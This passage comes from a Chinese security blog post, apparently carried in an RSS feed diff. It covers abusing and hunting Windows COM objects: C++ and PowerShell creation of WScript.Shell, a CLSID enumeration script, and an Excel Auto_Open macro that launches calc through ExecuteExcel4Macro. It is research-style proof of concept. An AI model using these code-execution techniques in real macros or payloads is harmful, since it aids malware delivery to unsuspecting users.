+    &lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpDisp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IID_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOCALE_SYSTEM_DEFAULT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DISPATCH_METHOD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FAILED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Clean up&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;//--------------------------&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpDisp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CoUninitialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;步骤一、二都是用来初始化调用COM对象，步骤三使用了CoCreateInstance创建了WScript.Shell对象的IDispatch类接口，使用GetIDsOfNames函数获得了Run函数的ID。步骤四通过函数ID使用Invoke函数执行了Run方法起calc，最终运行的效果和IE的EXP一致，这里就不再展示了。&lt;/p&gt;
+
+&lt;p&gt;那么，如此复杂的方式相比VBS有什么好处呢？那就是可以将C++代码通过shellcode生成框架转化为shellcode，生成后的shellcode比VBS能用在更多的地方，更加灵活，至于如何将代码转换成shellcode本文就不再讲述了。&lt;/p&gt;
+
+&lt;h2 id=&quot;通过powershell创建com对象&quot;&gt;通过powershell创建COM对象&lt;/h2&gt;
+
+&lt;p&gt;接下来就是最后一种创建COM对象的方式：使用powershell创建COM对象。使用powershell一样可以分别通过ProgID和CLSID创建，通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$shell = [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;WScript.Shell&quot;))&lt;/code&gt;命令即可通过ProgID创建WSH对象，而通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$shell = [Activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;72C24DD5-D70A-438B-8A42-98424B88AFB8&quot;))&lt;/code&gt;则可以通过CLSID创建，下图是通过CLSID创建后的效果：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/powershell创建COM.png&quot; alt=&quot;powershell创建COM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过这种创建COM对象的方式，我们便可以编写powershell脚本进行COM对象的遍历了，获取计算机中大部分COM对象的方法和属性了。&lt;/p&gt;
+
+&lt;h1 id=&quot;com对象的挖掘&quot;&gt;COM对象的挖掘&lt;/h1&gt;
+
+&lt;p&gt;这部分的内容参考了FIREEYE的研究进行，利用powershell脚本遍历COM对象的方式成功挖掘到一种利用方式，故此分享。&lt;/p&gt;
+
+&lt;h2 id=&quot;已公开com对象利用挖掘&quot;&gt;已公开COM对象利用挖掘&lt;/h2&gt;
+
+&lt;p&gt;首先需要遍历系统中所有COM对象的CLSID，于是编写powershell脚本，将CLSID输出到txt文本中：&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;New-PSDrive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PSProvider&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;registry&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Root&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKEY_CLASSES_ROOT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKCR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKCR:\CLSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Skip&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clsids.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;生成的clsid.txt如图所示：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid.png&quot; alt=&quot;clsid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着利用这些clsid通过powershell创建对应的COM对象，并且使用Get-Member方法获取对应的方法和属性，并最终输出到文本中，pwoershell脚本如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$Position&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Filename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;clsid-members.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Filename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;clsids.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;ForEach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CLSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Position&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; - &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CLSID&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;------------------------&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Out-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Filename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Append&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CLSID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Out-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Filename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Append&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$handle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetTypeFromCLSID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CLSID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$handle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Member&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Out-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Filename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Append&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Position&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;脚本运行期间可能会打开各种软件，甚至会退出，需要截取clsid重新运行。运行后的文本内容为：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid-members.png&quot; alt=&quot;clsid-members&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过搜索关键词：execute、exec、和run，能够发现不少可以利用的COM对象。本人由于在研究宏相关的COM利用，于是尝试了关键字ExecuteExcel4Macro，结果意外的收获到了COM对象Microsoft.Office.Interop.Excel.GlobalClass：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro.png&quot; alt=&quot;ExecuteExcel4Macro&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;于是使用ExecuteExcel4Macro函数加载shell32.dll中的ShellExecuteA成功起calc：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbscript&quot;&gt;Sub Auto_Open()
+Set execl = GetObject(&quot;new:00020812-0000-0000-C000-000000000046&quot;)
+execl.ExecuteExcel4Macro (&quot;CALL(&quot;&quot;shell32&quot;&quot;, &quot;&quot;ShellExecuteA&quot;&quot;, &quot;&quot;JJJCJJH&quot;&quot;, -1, 0, &quot;&quot;CALC&quot;&quot;, 0, 0, 5)&quot;)
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro-calc.png&quot; alt=&quot;ExecuteExcel4Macro-calc&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;未公开com对象利用挖掘&quot;&gt;未公开COM对象利用挖掘&lt;/h2&gt;
+
+&lt;p&gt;对于已经公开的COM对象挖掘较为容易，当面对未公开的COM对象时，就需要通过逆向挖掘利用。比如位于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\windows\system32\wat\watweb.dll&lt;/code&gt;中的WatWeb.WatWebObject对象公开了一个名为LaunchSystemApplication的方法，在oleview中能看到需要3个参数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/oleview.png&quot; alt=&quot;oleview&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但仅凭这些信息无法确定该方法是否能起任意进程，于是逆向查看LaunchSystemApplication，由于有调试符号，因此可以直接定位到该方法：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplication.png&quot; alt=&quot;LaunchSystemApplication&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;LaunchSystemApplication调用LaunchSystemApplicationInternal，进入查看发现调用了CreateProcess，有利用的可能：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplicationInternal.png&quot; alt=&quot;LaunchSystemApplicationInternal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但是可以看到调用了IsApprovedApplication方法进行校验，进入查看：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/IsApprovedApplication.png&quot; alt=&quot;IsApprovedApplication&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExeName.png&quot; alt=&quot;ExeName&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;发现需要校验传入的字符串为slui.exe，同时会将该字符串附加到系统路径下，因此并不能随意执行进程。尽管最终没有利用成功，但是这种思路可以帮助分析其他未知的COM对象，挖掘到更多的利用方式。&lt;/p&gt;
+
+&lt;h1 id=&quot;结论&quot;&gt;结论&lt;/h1&gt;
+
+&lt;p&gt;COM对象功能强大，灵活便捷，可以用于浏览器、脚本、Office宏、shellcode和powershell。通过powershell遍历系统中的COM对象，结合逆向分析更有可能发现未公开的利用方式。&lt;/p&gt;
+
+&lt;h1 id=&quot;参考链接&quot;&gt;参考链接&lt;/h1&gt;
+
+&lt;p&gt;[1] &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html&quot;&gt;FireEye-Hunting COM Objects&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[2] &lt;a href=&quot;https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html&quot;&gt;Github-Brian Pak-CVE-2016-0189-exploit&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[3] &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown&quot;&gt;Microsoft-IUnknown接口说明文档&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[4] &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory&quot;&gt;Microsoft-IClassFactory接口说明文档&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[5] &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch&quot;&gt;Microsoft-IDispatch接口说明文档&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[6] &lt;a href=&quot;https://blog.csdn.net/weiwangchao_/article/details/6949264&quot;&gt;CSDN-COM三大接口:IUnknown、IClassFactory、IDispatch&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 28 Jul 2021 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2021/07/28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98.html</link>
+        <guid isPermaLink="true">http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2021/07/28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98.html</guid>
+        
+        <category>COM</category>
+        
+        
+        <category>漏洞利用</category>
+        
+      </item>
+    
+  </channel>
+</rss>
